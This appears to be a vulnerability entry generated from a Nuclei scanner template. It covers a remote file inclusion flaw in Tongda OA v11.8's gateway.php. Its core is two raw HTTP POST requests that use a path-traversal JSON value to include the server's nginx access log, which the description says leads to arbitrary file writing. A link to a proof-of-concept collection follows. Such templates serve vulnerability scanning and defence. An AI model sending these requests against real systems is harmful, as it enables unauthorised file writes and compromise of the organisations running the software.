# Nuclei Template: Tongda OA v11.8 getway.php - Remote File Inclution
**Template ID:** tongda-getway-rfi
**Vulnerability Class:** Remote File Inclusion
**Severity:** Critical
**CWE:** CWE-98
**Source:** Nuclei Template (`tongda-getway-rfi.yaml`)

## Vulnerability Information & PoC

## Description
There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability

## Steps to reproduce / Exploit Payload
```http
POST /ispirit/interface/gateway.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}

POST /mac/gateway.php HTTP/1.1
Host: {{Hostname}}
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.8%20getway.php%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md
